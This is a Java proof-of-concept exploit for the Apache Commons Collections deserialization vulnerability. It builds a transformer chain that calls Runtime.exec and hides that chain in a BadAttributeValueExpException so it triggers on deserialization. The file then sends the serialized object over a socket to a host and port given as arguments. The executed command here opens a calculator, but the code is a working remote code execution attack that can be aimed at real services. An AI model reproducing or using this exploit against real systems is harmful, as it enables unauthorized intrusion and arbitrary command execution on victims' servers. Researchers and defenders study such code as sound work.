package me.lightless.ApacheCommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Exception {

        String targetAddress = args[0];
        int targetPort = Integer.parseInt(args[1]);

        // Build Runtime payload
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"}),
                new ConstantTransformer("1")
        };
        Transformer transformChain = new ChainedTransformer(transformers);

        // Build a vulnerability map object
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233");

        // Build an exception to trigger our payload when unserialize
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        Field valField = exception.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(exception, entry);

        // send payload to target!
        // or write to file
        // ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        // oos.writeObject(payload);
        Socket socket=new Socket(targetAddress, targetPort);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
        objectOutputStream.writeObject(exception);
        objectOutputStream.flush();
    }
}
